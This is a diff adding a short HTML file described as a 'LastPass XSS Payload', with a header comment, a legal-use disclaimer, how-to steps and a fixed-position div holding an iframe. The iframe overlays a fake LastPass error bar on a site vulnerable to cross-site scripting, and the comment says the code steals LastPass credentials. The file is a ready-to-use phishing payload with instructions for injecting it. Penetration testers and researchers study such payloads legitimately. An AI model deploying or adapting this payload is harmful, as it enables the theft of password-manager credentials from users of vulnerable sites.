@@ -1,0 +1,21 @@
+<!--
+
+LastPass XSS Payload
+greg . foss [at] owasp . org
+4/24/2014
+v 0.1 Beta
+
+The code below can be used to exploit XSS vulnerabilities and steal LastPass credentials.
+
+# ONLY USE THIS PAYLOAD LEGALLY, AGAINST AUTHORIZED TARGETS
+# THE DEVELOPER OF THIS PAYLOAD IS NOT LIABLE FOR ILLEGAL/QUESTIONABLE ACTIVITIES CONDUCTED WITH THIS TOOL
+# BY USING THIS TOOL, YOU AGREE THAT YOU HAVE READ AND UNDERSTAND THESE TERMS
+
+How To:
+	Simply change the iFrame source to the full location of the fake LastPass 'error-overlay.php' page. You can alter the look of the LastPass overlay by changing the 'error code' from 1 (red) to 0 (grey).
+
+	You will need a site that is vulnerable to Cross-Site Scripting (XSS) and allows both the <div> and <iframe> HTML tags within the vulnerable parameter to utilize this payload effectively.
+
+-->
+
+<div style="top: 0px; left: 0px; height: 1px; width: 100%; position: fixed; background-color: black; z-index: 1000000099; visibility: visible;"><iframe src="error-overlay.php?&amp;error=1" scrolling="no" style="height: 27px; width: 100%; border: 0px;"></iframe></div>
